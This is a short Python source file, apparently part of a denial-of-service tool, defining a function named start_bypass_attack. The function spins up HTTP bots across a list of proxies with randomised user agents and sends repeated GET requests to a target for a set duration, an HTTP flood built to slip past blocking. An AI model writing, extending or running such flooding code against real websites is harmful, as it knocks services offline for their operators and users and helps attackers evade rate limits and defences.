import time
from utils.http_bot import HTTPBot
from utils.random_utils import random_item

def start_bypass_attack(target, proxies, user_agents, duration):
    bots = [HTTPBot(proxy, random_item(user_agents)) for proxy in proxies]
    end_time = time.time() + duration

    while time.time() < end_time:
        for bot in bots:
            bot.get_request(target)
            time.sleep(0.1)
